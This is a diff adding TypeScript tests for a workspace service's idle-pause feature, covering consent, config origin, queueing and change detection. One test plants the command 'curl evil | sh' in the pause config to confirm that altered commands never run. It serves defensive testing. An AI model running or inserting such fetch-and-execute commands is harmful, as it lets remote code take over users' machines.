@@ -2554,3 +2554,239 @@ describe("WorkspaceService.switchWorktreeEnvironment", () => {
     vi.mocked(childProcessModule.spawn).mockImplementation(makeSpawnChild(exitCode, stdoutData));
   }
 });
+
+describe("WorkspaceService idle pause (#17925)", () => {
+  let service: WorkspaceService;
+  let WorktreeMonitorClass: typeof WorktreeMonitor;
+  let consents: Map<string, { fingerprint: string; revoked?: true }>;
+  let ran: string[][];
+
+  /** The person's own config, from their projects folder rather than the repository. */
+  const USER_CONFIG = /\/\.daintree\/projects\/[^/]+\/config\.json$/;
+  const REPO_CONFIG = /\/test\/root\/\.daintree\/config\.json$/;
+
+  beforeEach(async () => {
+    vi.clearAllMocks();
+    const WorkspaceServiceModule = await import("../WorkspaceService.js");
+    service = new WorkspaceServiceModule.WorkspaceService(
+      vi.fn() as unknown as (event: WorkspaceHostEvent) => void
+    );
+    const WorktreeMonitorModule = await import("../WorktreeMonitor.js");
+    WorktreeMonitorClass = WorktreeMonitorModule.WorktreeMonitor;
+    service["projectRootPath"] = "/test/root";
+    service["git"] = mockSimpleGit as unknown as SimpleGit;
+
+    consents = new Map();
+    Object.assign(service["idlePause"], {
+      consents: {
+        get: async (_root: string, selector: string) => consents.get(selector) ?? null,
+        set: async (_root: string, selector: string, fingerprint: string) => {
+          consents.set(selector, { fingerprint });
+        },
+        revoke: async (_root: string, selector: string, fingerprint: string) => {
+          if (consents.get(selector)?.fingerprint === fingerprint) {
+            consents.set(selector, { fingerprint, revoked: true });
+          }
+        },
+        clear: async (_root: string, selector: string) => {
+          consents.delete(selector);
+        },
+      },
+    });
+
+    ran = [];
+    vi.spyOn(service["lifecycleService"], "runCommands").mockImplementation(async (commands) => {
+      ran.push([...commands]);
+      return { success: true, output: "paused" };
+    });
+  });
+
+  afterEach(() => {
+    vi.restoreAllMocks();
+  });
+
+  function readyBox(): WorktreeMonitor {
+    const wt = createTestWorktree();
+    const monitor = new WorktreeMonitorClass(
+      wt,
+      {
+        basePollingInterval: 10000,
+        adaptiveBackoff: false,
+        pollIntervalMax: 30000,
+        circuitBreakerThreshold: 3,
+        gitWatchEnabled: false,
+      },
+      { onUpdate: vi.fn() },
+      "main"
+    );
+    monitor.setResourceStatus({ lastStatus: "ready", ssh: "dev@box-1" });
+    service["monitors"].set(wt.id, monitor);
+    return monitor;
+  }
+
+  async function configAt(where: RegExp, config: Record<string, unknown>) {
+    const fsModule = await import("fs/promises");
+    vi.mocked(fsModule.access).mockImplementation(async (p: unknown) => {
+      if (where.test(n(p as string))) return undefined;
+      throw new Error("ENOENT");
+    });
+    vi.mocked(fsModule.readFile).mockResolvedValue(JSON.stringify(config) as never);
+  }
+
+  async function turnOn(): Promise<void> {
+    const policy = await service.getIdlePausePolicy("/test/worktree");
+    if (policy.status !== "available") throw new Error(`unavailable: ${policy.reason}`);
+    await service.setIdlePause("/test/worktree", true, policy.fingerprint);
+  }
+
+  async function checkedGuard() {
+    const check = await service.checkIdlePause("/test/worktree");
+    if (!check.ok) throw new Error(check.reason);
+    return check.guard;
+  }
+
+  it("runs the environment's pause as a manual pause does, once checked", async () => {
+    const monitor = readyBox();
+    await configAt(USER_CONFIG, { resource: { pause: ["stop-box"], provision: ["up"] } });
+    await turnOn();
+
+    const guard = await checkedGuard();
+    expect(guard.sshTarget).toBe("dev@box-1");
+    const outcome = await service.runIdlePause("req-idle", "/test/worktree", guard);
+
+    expect(outcome).toEqual({ ran: true, success: true });
+    expect(ran).toEqual([["stop-box"]]);
+    expect(monitor.resourceStatus?.pausedAt).toBeTypeOf("number");
+    expect(monitor.resourceStatus?.ssh).toBeUndefined();
+  });
+
+  it("is off until turned on", async () => {
+    readyBox();
+    await configAt(USER_CONFIG, { resource: { pause: ["stop-box"] } });
+
+    const check = await service.checkIdlePause("/test/worktree");
+
+    expect(check).toEqual({ ok: false, reason: expect.stringMatching(/off/) });
+    expect(ran).toEqual([]);
+  });
+
+  it("refuses an environment from the repository, approved or not", async () => {
+    readyBox();
+    allowRepositoryCommands(service);
+    await configAt(REPO_CONFIG, { resource: { pause: ["stop-box"] } });
+
+    expect(await service.getIdlePausePolicy("/test/worktree")).toMatchObject({
+      status: "unavailable",
+      reason: "repository",
+    });
+    expect(await service.checkIdlePause("/test/worktree")).toEqual({
+      ok: false,
+      reason: expect.stringMatching(/repository/),
+    });
+  });
+
+  it("is never queued behind another resource action", async () => {
+    readyBox();
+    await configAt(USER_CONFIG, { resource: { pause: ["stop-box"], resume: ["start-box"] } });
+    await turnOn();
+    const guard = await checkedGuard();
+
+    let finishResume!: () => void;
+    vi.spyOn(service["lifecycleService"], "runCommands").mockImplementationOnce(
+      (commands) =>
+        new Promise((resolve) => {
+          ran.push([...commands]);
+          finishResume = () => resolve({ success: true, output: "" });
+        })
+    );
+    const resume = service.runResourceAction("req-resume", "/test/worktree", "resume");
+    await vi.waitFor(() => expect(ran).toEqual([["start-box"]]));
+
+    expect(await service.checkIdlePause("/test/worktree")).toEqual({
+      ok: false,
+      reason: expect.stringMatching(/queued or running/),
+    });
+    const outcome = await service.runIdlePause("req-idle", "/test/worktree", guard);
+    expect(outcome).toEqual({ ran: false, reason: expect.stringMatching(/queued or running/) });
+
+    finishResume();
+    await resume;
+    expect(ran).toEqual([["start-box"]]);
+  });
+
+  it("refuses a pause checked before another resource action ran", async () => {
+    readyBox();
+    await configAt(USER_CONFIG, { resource: { pause: ["stop-box"], resume: ["start-box"] } });
+    await turnOn();
+    const guard = await checkedGuard();
+
+    await service.runResourceAction("req-resume", "/test/worktree", "resume");
+    const outcome = await service.runIdlePause("req-idle", "/test/worktree", guard);
+
+    expect(outcome).toEqual({ ran: false, reason: expect.stringMatching(/ran since/) });
+    expect(ran).toEqual([["start-box"]]);
+  });
+
+  it("turns off and runs nothing when the commands changed after the check", async () => {
+    readyBox();
+    await configAt(USER_CONFIG, { resource: { pause: ["stop-box"] } });
+    await turnOn();
+    const guard = await checkedGuard();
+
+    await configAt(USER_CONFIG, { resource: { pause: ["stop-box", "curl evil | sh"] } });
+    const outcome = await service.runIdlePause("req-idle", "/test/worktree", guard);
+
+    expect(outcome).toEqual({ ran: false, reason: expect.stringMatching(/changed/) });
+    expect(ran).toEqual([]);
+    expect(await service.getIdlePausePolicy("/test/worktree")).toMatchObject({
+      enabled: false,
+      changed: true,
+    });
+  });
+
+  it("refuses once a repository config wins over the person's own", async () => {
+    readyBox();
+    await configAt(USER_CONFIG, { resource: { pause: ["stop-box"] } });
+    await turnOn();
+    const guard = await checkedGuard();
+
+    // The worktree's own config now wins, with the same command.
+    await configAt(/\/test\/worktree\/\.daintree\/config\.json$/, {
+      resource: { pause: ["stop-box"] },
+    });
+    const outcome = await service.runIdlePause("req-idle", "/test/worktree", guard);
+
+    expect(outcome).toEqual({ ran: false, reason: expect.stringMatching(/repository/) });
+    expect(ran).toEqual([]);
+  });
+
+  it("shows a failed pause as a manual one does", async () => {
+    const monitor = readyBox();
+    await configAt(USER_CONFIG, { resource: { pause: ["stop-box"] } });
+    await turnOn();
+    const guard = await checkedGuard();
+    vi.spyOn(service["lifecycleService"], "runCommands").mockResolvedValueOnce({
+      success: false,
+      output: "denied",
+      error: "Command failed with exit code 1",
+    });
+
+    const outcome = await service.runIdlePause("req-idle", "/test/worktree", guard);
+
+    expect(outcome).toEqual({ ran: true, success: false, error: "Command failed with exit code 1" });
+    expect(monitor.lifecycleStatus).toMatchObject({ phase: "resource-pause", state: "failed" });
+    expect(monitor.resourceStatus?.ssh).toBe("dev@box-1");
+  });
+
+  it("refuses a box the environment no longer reports as ready", async () => {
+    const monitor = readyBox();
+    monitor.setResourceStatus({ lastStatus: "paused" });
+    await configAt(USER_CONFIG, { resource: { pause: ["stop-box"] } });
+    await turnOn();
+
+    expect(await service.checkIdlePause("/test/worktree")).toEqual({
+      ok: false,
+      reason: expect.stringMatching(/no ready machine/),
+    });
+  });
+});
